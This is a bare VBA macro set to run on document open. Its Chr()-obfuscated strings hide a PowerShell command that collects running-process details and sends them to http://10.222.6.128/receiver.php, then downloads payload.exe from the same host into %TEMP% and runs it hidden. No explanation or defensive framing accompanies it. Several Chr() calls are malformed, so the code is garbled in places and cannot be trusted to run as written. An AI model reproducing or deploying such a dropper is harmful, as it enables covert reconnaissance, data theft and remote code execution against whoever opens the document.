Private Sub Document_Open()
    Dim shell As Object
    Set shell = CreateObject(Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108))
    
    Dim psCommand As String
    psCommand = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32 & Chr(45) & Chr(67) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & Chr(110) & Chr(100) & Chr(32 & Chr(34) & Chr(71) & Chr(101) & Chr(116) & Chr(45) & Chr(87) & Chr(109) & Chr(105) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(45) & Chr(81) & Chr(117) & Chr(101) & Chr(114) & Chr(121) & Chr(32) & Chr(39) & Chr(83) & Chr(69) & Chr(76) & Chr(69) & Chr(67) & Chr(84) & Chr(32) & Chr(42) & Chr(32) & Chr(70) & Chr(82) & Chr(79) & Chr(77) & Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(51) & Chr(50) & Chr(95) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(39) & Chr(32) & Chr(124) & Chr(32 Chr(70) & Chr(111) & Chr(114) & Chr(69) & Chr(97) & Chr(99) & Chr(104) & Chr(45) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(123) & Chr(32) & Chr(36) & Chr(95) & Chr(46) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(32) & Chr(38) & Chr(32 Chr(39) & Chr(32) & Chr(38) & Chr(32 Chr(36) & Chr(95) & Chr(46) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(73) & Chr(100) & Chr(32) & Chr(38) & Chr(32 Chr(39) & Chr(32) & Chr(38) & Chr(32 Chr(36) & Chr(95) & Chr(46) & Chr(69) & Chr(120) & Chr(101) & Chr(99) & Chr(117) & Chr(116) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(80) & Chr(97) & Chr(116) & Chr(104) & Chr(32) & Chr(125) & Chr(32) & Chr(124) & Chr(32 Chr(79) & Chr(117) & Chr(116) & Chr(45) & Chr(83) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(32) & Chr(124) & Chr(32 Chr(70) & Chr(111) & Chr(114) & Chr(69) & Chr(97) & Chr(99) & Chr(104) & Chr(45) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(123) & Chr(32) & Chr(91) & Chr(67) & Chr(111) & Chr(110) & Chr(118) & Chr(101) & Chr(114] & Chr(116] & Chr(46] & Chr(84) & Chr(111) & Chr(66) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52) & Chr(83) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103] & Chr(40) & Chr(91) & Chr(84) & Chr(101) & Chr(120) & Chr(116] & Chr(46) & Chr(69) & Chr(110) & Chr(99) & Chr(111) & Chr(100) & Chr(105) & Chr(110) & Chr(103] & Chr(46] & Chr(85) & Chr(84) & Chr(70) & Chr(56] & Chr(46) & Chr(71) & Chr(101) & Chr(116) & Chr(66) & Chr(121) & Chr(116) & Chr(101) & Chr(115] & Chr(40) & Chr(36) & Chr(95) & Chr(41) & Chr(41) & Chr(32) & Chr(125) & Chr(34))
    
    Dim processInfo As String
    processInfo = shell.Exec(psCommand).StdOut.ReadAll
    
    Dim http As Object
    Set http = CreateObject(Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(88) & Chr(77) & Chr(76) & Chr(72) & Chr(84))
    http.Open Chr(71) & Chr(69) & Chr(84), Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(48) & Chr(46) & Chr(50) & Chr(50) & Chr(50) & Chr(46) & Chr(54) & Chr(46) & Chr(49) & Chr(50) & Chr(56) & Chr(47) & Chr(114) & Chr(101) & Chr(99) & Chr(101) & Chr(105) & Chr(118) & Chr(101) & Chr(114) & Chr(46) & Chr(112) & Chr(104) & Chr(112) & Chr(63) & Chr(100) & Chr(97) & Chr(116) & Chr(97) & Chr(61) & Chr(38) & processInfo, False
    http.Send
    
    Dim payloadURL As String
    payloadURL = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(48) & Chr(46) & Chr(50) & Chr(50) & Chr(50) & Chr(46) & Chr(54) & Chr(46) & Chr(49) & Chr(50) & Chr(56) & Chr(47) & Chr(112) & Chr(97) & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    
    Dim payloadPath As String
    payloadPath = shell.ExpandEnvironmentStrings(Chr(37) & Chr(84) & Chr(69) & Chr(77) & Chr(80) & Chr(37) & Chr(92)) & Chr(112) & Chr(97) & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    
    Dim xmlHTTP As Object
    Set xmlHTTP = CreateObject(Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(88) & Chr(77) & Chr(76) & Chr(72) & Chr(84))
    xmlHTTP.Open Chr(71) & Chr(69) & Chr(84), payloadURL, False
    xmlHTTP.Send
    
    Dim adoStream As Object
    Set adoStream = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(83) & Chr(116) & Chr(114) & Chr(101) & Chr(97) & Chr(109))
    adoStream.Type = 1
    adoStream.Open
    adoStream.Write xmlHTTP.ResponseBody
    adoStream.SaveToFile payloadPath, 2
    
    shell.Run payloadPath, 0, True
End Sub